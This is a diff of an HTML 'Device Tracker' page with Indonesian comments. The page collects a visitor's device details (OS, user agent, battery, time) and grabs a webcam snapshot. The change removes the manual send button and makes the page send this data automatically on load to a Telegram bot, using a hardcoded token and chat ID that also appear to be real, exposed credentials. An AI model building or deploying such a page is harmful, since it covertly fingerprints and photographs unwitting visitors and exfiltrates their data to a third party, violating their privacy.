@@ -3,24 +3,22 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Device Tracker Personal</title>
+<title>Device Tracker Personal Otomatis</title>
 <style>
   body { background: #0d1117; color: #c9d1d9; font-family: Arial, sans-serif; padding: 20px; }
   pre { background: #161b22; padding: 15px; border-radius: 8px; white-space: pre-wrap; max-width: 100%; overflow-x: auto; }
-  button { background: #238636; color: white; border: none; padding: 10px 20px; margin-top: 15px; cursor: pointer; border-radius: 5px; font-size: 16px; }
   video { margin-top: 15px; border-radius: 8px; max-width: 300px; }
 </style>
 </head>
 <body>
-<h1>Device Tracker (Personal)</h1>
+<h1>Device Tracker Otomatis (Personal)</h1>
 <pre id="info">Mengambil data...</pre>
-<button id="send">Kirim ke Bot Telegram</button>
 <video id="video" autoplay playsinline></video>
 <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
 
 <script>
-const token = '7435851375:AAH7RpYei5mXA0YU0MogtjZ9FQZgA4ZzoX8'; // ganti dengan token bot Telegrammu
-const chatId = '-1003094524054';   // ganti dengan chat IDmu
+const token = '7435851375:AAH7RpYei5mXA0YU0MogtjZ9FQZgA4ZzoX8';
+const chatId = '-1003094524054';
 
 function parseOS(ua) {
   if (/Windows/.test(ua)) return "Windows";
@@ -71,7 +69,7 @@ async function getDeviceInfo() {
     pdfViewerEnabled: !!navigator.pdfViewerEnabled,
     batteryLevel: battery.level,
     charging: battery.charging,
-    ip: '127.0.0.1', // placeholder, bisa pakai API eksternal jika mau
+    ip: '127.0.0.1',
     access_time: new Date().toISOString(),
     local_time: new Date().toLocaleString()
   };
@@ -131,13 +129,15 @@ async function start() {
   const v = await getDeviceInfo();
   document.getElementById('info').innerText = formatTemplate(v);
 
-  // Webcam (opsional)
+  // Otomatis kirim ke Telegram
+  await sendToTelegram(formatTemplate(v));
+
+  // Webcam snapshot (opsional)
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
     const video = document.getElementById('video');
     video.srcObject = stream;
 
-    // Ambil foto sekali
     const canvas = document.getElementById('canvas');
     await new Promise(res => setTimeout(res, 1000));
     canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -151,11 +151,6 @@ async function start() {
     console.log('Webcam tidak diizinkan atau tidak tersedia.');
   }
 }
-
-document.getElementById('send').addEventListener('click', async () => {
-  const v = await getDeviceInfo();
-  await sendToTelegram(formatTemplate(v));
-});
 
 start();
 </script>
